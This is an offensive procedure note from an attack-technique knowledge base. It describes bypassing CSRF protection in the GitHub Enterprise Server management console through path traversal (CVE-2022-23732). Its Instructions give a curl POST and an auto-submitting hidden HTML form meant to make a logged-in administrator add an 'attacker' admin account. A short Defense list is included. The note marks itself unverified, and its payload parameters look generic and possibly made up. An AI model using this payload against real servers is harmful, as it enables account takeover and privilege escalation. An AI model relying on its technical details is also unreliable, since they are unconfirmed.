---
tags:
  - csrf
  - path-traversal
  - privilege-escalation
  - github-enterprise
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-csrf-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:27:57.873Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 530334e2-231b-442c-8bba-af710dbc4ed7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# CSRF Bypass via Path Traversal in GitHub Enterprise Server Management Console

## Summary

This procedure exploits a path traversal vulnerability in the GitHub Enterprise Server (GHES) management console to bypass Cross-Site Request Forgery (CSRF) protections. By crafting requests that traverse directories, attackers can manipulate or ignore CSRF token validation, allowing unauthorized actions such as privilege escalation when targeting logged-in administrators. This was reported as CVE-2022-23732 and affects GHES versions prior to 3.5.

## Description

The GHES management console enforces CSRF protections to prevent unauthorized requests from external sites. However, a path traversal flaw allows attackers to redirect the token validation path to an unprotected location (e.g., using '../' sequences). In an attack scenario, the attacker creates a malicious webpage or email link that, when interacted with by a logged-in admin, submits a forged request to perform sensitive operations like user management or configuration changes. Prerequisites include knowledge of the console endpoint and the ability to deliver the payload to a victim. Expected outcomes include successful execution of privileged actions without authentication prompts, leading to escalation or data access.

## Requirements

1. Access to the GHES management console URL (e.g., https://<ghes-host>/manage)
2. Victim must be actively logged in as an admin
3. Tools for crafting and sending HTTP requests (e.g., curl or browser)
4. Network connectivity to the target GHES instance

## Defense

Defensive measures and detection strategies:

- Upgrade to patched versions (3.1.19, 3.2.11, 3.3.6, 3.4.1 or later)
- Implement strict path normalization and validation in web apps to prevent traversal
- Monitor for anomalous requests to management endpoints with suspicious paths (e.g., containing '../')
- Use Content Security Policy (CSP) and strict referrer checks to mitigate CSRF

## Objectives

1. Bypass CSRF token validation using path traversal
2. Execute unauthorized privileged actions on behalf of the victim
3. Achieve privilege escalation or unauthorized access in GHES

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate the management console and confirm the version is vulnerable (prior to 3.5). Use browser inspection or reconnaissance to map endpoints.

No specific command; manually access https://<ghes-host>/manage and check version in footer or API.

> Expected: Confirmation of vulnerable version and active login session.

### Step 2: Craft and Send Malicious Request

**Context**: Construct a POST request to a sensitive action endpoint, embedding path traversal in parameters related to CSRF handling (e.g., token path).

**Command** ([[commands/curl-csrf-bypass]]):
```bash
curl -X POST 'https://<ghes-host>/manage/settings' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://attacker-site.com' \
  -d 'csrf_path=../../../bypass&action=add_user&user=attacker&role=admin'
```

> This command sends a forged request attempting to traverse to a non-protected path for CSRF validation, performing a privilege-escalating action like adding an admin user. Deliver via a hidden form on a malicious site: <form action="https://<ghes-host>/manage/settings" method="POST"><input type="hidden" name="csrf_path" value="../../../bypass"><input type="hidden" name="action" value="add_user"><input type="hidden" name="user" value="attacker"><input type="hidden" name="role" value="admin"></form><script>document.forms[0].submit();</script>. Expected output: 200 OK response with success message, no CSRF error.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-csrf-bypass]]

## Tools Used


## Tags

- csrf
- path-traversal
- github-enterprise
- privilege-escalation
